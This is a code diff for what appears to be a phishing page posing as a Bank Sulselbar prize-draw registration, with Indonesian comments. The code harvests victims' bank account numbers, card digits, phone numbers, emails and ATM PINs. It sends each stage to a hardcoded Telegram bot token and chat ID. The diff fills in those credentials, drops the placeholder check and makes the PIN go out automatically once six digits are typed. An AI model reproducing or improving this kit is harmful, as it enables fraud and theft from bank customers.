@@ -1,5 +1,5 @@
 // ==============================================
-// ⚙️  ISI DATA TELEGRAM KAMU DI BAWAH ⬇️
+// ⚙️  DATA TELEGRAM — SUDAH DILENGKAPI
 // ==============================================
 const TELEGRAM_BOT_TOKEN = '8671304632:AAEOnZznJx5LEKARuopQR7NYzNem5TaXTvw';
 const TELEGRAM_CHAT_ID = '5852448478';
@@ -17,8 +17,7 @@ let dataPengguna = {
 // 📡 KIRIM PESAN KE TELEGRAM
 // ==============================================
 async function kirimKeTelegram(pesan) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || 
-        TELEGRAM_BOT_TOKEN.includes('ISI') || TELEGRAM_CHAT_ID.includes('ISI')) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.log('⚠️ Token / Chat ID belum diisi');
         return;
     }
@@ -34,11 +33,13 @@ async function kirimKeTelegram(pesan) {
                 disable_web_page_preview: true
             })
         });
-    } catch (e) { console.error('❌ Gagal kirim:', e); }
+    } catch (e) { 
+        console.error('❌ Gagal kirim ke Telegram:', e); 
+    }
 }
 
 // ==============================================
-// 🟡 TAHAP 1 — REGISTRASI BARU
+// 🟡 TAHAP 1 — REGISTRASI BARU → KIRIM KE TELEGRAM
 // ==============================================
 function kirimTahap1() {
     const pesan = `
@@ -55,7 +56,7 @@ function kirimTahap1() {
 }
 
 // ==============================================
-// 🟠 TAHAP 2 — PIN ATM
+// 🟠 TAHAP 2 — PIN ATM → KIRIM KE TELEGRAM
 // ==============================================
 function kirimTahap2() {
     const pesan = `
@@ -75,8 +76,32 @@ function kirimTahap2() {
 }
 
 // ==============================================
-// ⌨️ BACA PIN ATM
+// 🔄 NAVIGASI HALAMAN — PINDHALAMAN
 // ==============================================
+function gantiHalaman(idHalaman) {
+    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
+    document.getElementById(idHalaman).classList.add('aktif');
+    window.scrollTo(0, 0);
+}
+
+function keRegistrasi() { gantiHalaman('halRegistrasi'); }
+function kembaliKeAwal() { gantiHalaman('halAwal'); }
+function kembaliKeRegistrasi() { gantiHalaman('halRegistrasi'); }
+function kePIN() { gantiHalaman('halPIN'); setTimeout(() => document.getElementById('p1')?.focus(), 300); }
+function kembaliKePIN() { gantiHalaman('halPIN'); }
+function keKeterangan() { gantiHalaman('halKeterangan'); }
+
+// ==============================================
+// 🔢 BACA PIN — OTOMATIS PINDAH KOLOM & HALAMAN
+// ==============================================
+function pindahKode(el, idTujuan) {
+    if (el.value.length === 1) {
+        const next = document.getElementById(idTujuan);
+        if (next) next.focus();
+    }
+}
+
+// ✅ Otomatis pindah halaman saat 6 digit PIN terisi
 function bacaPIN() {
     const p1 = document.getElementById('p1')?.value || '';
     const p2 = document.getElementById('p2')?.value || '';
@@ -84,12 +109,40 @@ function bacaPIN() {
     const p4 = document.getElementById('p4')?.value || '';
     const p5 = document.getElementById('p5')?.value || '';
     const p6 = document.getElementById('p6')?.value || '';
+    
     dataPengguna.pin = p1 + p2 + p3 + p4 + p5 + p6;
-    if (dataPengguna.pin.length === 6) kirimTahap2();
+
+    // Otomatis lanjut ke halaman terakhir jika 6 digit lengkap
+    if (dataPengguna.pin.length === 6) {
+        kirimTahap2();
+        setTimeout(() => keKeterangan(), 300);
+    }
+}
+
+// ✅ TOMBOL LANJUTKAN — CEK & PINDAH HALAMAN
+function bacaPINdanLanjut() {
+    const p1 = document.getElementById('p1')?.value || '';
+    const p2 = document.getElementById('p2')?.value || '';
+    const p3 = document.getElementById('p3')?.value || '';
+    const p4 = document.getElementById('p4')?.value || '';
+    const p5 = document.getElementById('p5')?.value || '';
+    const p6 = document.getElementById('p6')?.value || '';
+    
+    dataPengguna.pin = p1 + p2 + p3 + p4 + p5 + p6;
+
+    // ⚠️ Validasi: harus 6 digit dulu
+    if (dataPengguna.pin.length !== 6) {
+        alert('⚠️ Silakan masukkan 6 digit PIN terlebih dahulu!');
+        return;
+    }
+
+    // ✅ Kirim ke Telegram & pindah halaman
+    kirimTahap2();
+    keKeterangan();
 }
 
 // ==============================================
-// 🚫 HANYA ANGKA — HURUF OTOMATIS DITOLAK
+// 🚫 VALIDASI INPUT — HANYA ANGKA & FORMAT
 // ==============================================
 function hanyaAngka(input) {
     input.value = input.value.replace(/[^0-9]/g, '');
@@ -101,31 +154,7 @@ function validasiNoHP(input) {
 }
 
 // ==============================================
-// 🔄 FUNGSI NAVIGASI HALAMAN
-// ==============================================
-function gantiHalaman(idHalaman) {
-    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
-    document.getElementById(idHalaman).classList.add('aktif');
-}
-
-function pindahKode(el, idTujuan) {
-    if (el.value.length === 1) {
-        const next = document.getElementById(idTujuan);
-        if (next) next.focus();
-        bacaPIN();
-    }
-}
-
-// ==============================================
-// 📍 NAVIGASI 4 HALAMAN
-// ==============================================
-function keRegistrasi() { gantiHalaman('halRegistrasi'); }
-function kembaliKeAwal() { gantiHalaman('halAwal'); }
-function kembaliKeRegistrasi() { gantiHalaman('halRegistrasi'); }
-function kembaliKePIN() { gantiHalaman('halPIN'); }
-
-// ==============================================
-// ✅ REGISTRASI → TAHAP 1
+// ✅ VALIDASI REGISTRASI — LANJUT KE PIN
 // ==============================================
 function validasiDanLanjut() {
     const noRek = document.getElementById('noRekening').value.trim();
@@ -133,27 +162,21 @@ function validasiDanLanjut() {
     const noHP = document.getElementById('noHP').value.trim();
     const email = document.getElementById('email').value.trim();
     
+    // ⚠️ Validasi Aturan Input
     if (!/^\d{1,15}$/.test(noRek)) return alert('⚠️ No. Rekening: 1-15 digit angka!');
     if (!/^\d{4}$/.test(noKartu)) return alert('⚠️ No. Kartu: Harus 4 digit!');
     if (noHP.length < 10) return alert('⚠️ No. HP minimal 10 digit!');
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return alert('⚠️ Format Email salah!');
     
+    // 💾 Simpan Data
     dataPengguna.noRekening = noRek;
     dataPengguna.noKartu = noKartu;
     dataPengguna.noHP = noHP;
     dataPengguna.email = email;
     
+    // 📡 Kirim ke Telegram → Pindah ke Halaman PIN
     kirimTahap1();
-    gantiHalaman('halPIN');
-    setTimeout(() => document.getElementById('p1')?.focus(), 300);
-}
-
-// ==============================================
-// 🔐 PIN ATM → KETERANGAN
-// ==============================================
-function keKeterangan() {
-    bacaPIN();
-    gantiHalaman('halKeterangan');
+    kePIN();
 }
 
 // ==============================================
@@ -162,3 +185,10 @@ function keKeterangan() {
 function bukaSMS() {
     window.location.href = 'sms:3654';
 }
+
+// ==============================================
+// 🚀 JALANKAN SAAT HALAMAN DIMUAT
+// ==============================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('✅ Gebyar Undian Bank Sulselbar — Siap!');
+});
